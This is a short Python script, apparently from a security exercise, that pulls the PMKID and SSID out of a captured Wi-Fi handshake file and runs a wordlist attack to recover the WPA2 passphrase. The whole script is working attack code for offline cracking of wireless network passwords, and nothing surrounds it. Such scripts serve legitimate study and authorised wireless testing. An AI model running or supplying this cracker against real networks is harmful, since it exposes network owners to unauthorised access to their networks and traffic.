#!/usr/bin/env python

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

packets = rdpcap("PMKID_handshake.pcap")

handshake = None
ssid = None
dictionary = 'wordlist.txt'

def findSSID():
    for pkt in packets:
        if pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 == handshake.addr2:
                return pkt.info


#find a packet which has a pmkid
for packet in packets:
    if packet.haslayer(EAPOL):
        handshake = packet
        ssid = findSSID()
        if ssid != None:
            break

# compute pmkid form packet
pmkid = b2a_hex(handshake.load)[-32:-20]

# set client and AP mac
APmac = a2b_hex(handshake.addr3.replace(':',''))
Clientmac = a2b_hex(handshake.addr1.replace(':',''))

print("ssid : ", ssid.decode("utf-8"))
print("APmac : ", b2a_hex(APmac))
print("Clientmap : ", b2a_hex(Clientmac))
print("target pmkid : ", pmkid, '\n')

print("Looking for the passphrase in : ", dictionary)
print('...\n')
# read wordlist line by line
with open(dictionary) as fp:
    passPhrase = fp.readline()[:-1]
    found = False
    while passPhrase:
        pp_encoded = str.encode(passPhrase)
        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1, str.encode(passPhrase), ssid, 4096, 32)
        # compute the PMKID with the tested passphrase
        computed_pmkid = hmac.new(pmk,str.encode("PMK Name")+APmac+Clientmac,hashlib.sha1).digest()[:6]

        # compare the PMKIDs
        if pmkid == b2a_hex(computed_pmkid):
            found = True
            print("The key was found ! It is : ", passPhrase)

        passPhrase = fp.readline()[:-1]
    
    if not found:
        print("pass phrase not in the list.")
